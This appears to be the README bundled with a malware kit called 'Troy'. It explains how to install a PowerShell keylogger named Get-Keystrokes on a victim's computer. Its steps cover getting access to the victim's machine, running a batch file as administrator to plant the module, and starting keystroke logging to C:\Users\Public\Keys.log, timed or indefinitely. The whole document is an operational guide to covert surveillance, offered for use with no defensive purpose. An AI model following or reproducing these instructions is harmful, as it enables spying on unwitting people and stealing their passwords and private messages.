

########################################
#      How to Use Keylogger Virus      #
########################################


When generated Troy will create several files in a folder called 'Get-Keystrokes'.

They should include:

1. Keylogger file
2. copy.bat 
3. This help guide.


What you need to do is:

1. Get access to the victim's computer.
2. Copy the folder to "C:\Users\Public" <-- You can replace this with whatever you like, just make sure you change it in copy.bat as well.
3. Run the batch file AS AN ADMINISTRATOR which will copy the keylogger to the powershell directory on the drive.
4. Press ( Windowskey + r)
5. type: powershell  and then press enter.
6. Type: Import-Module Get-Keystrokes
7. Type: Get-Keystrokes -LogPath C:\Users\Public\Keys.log -CollectionInterval X (replace the X with
			amount of minutes you want to record keystrokes. You may leave this command out and it will record indefinitely. 
			Beware that this may make a HUGE file on their machine.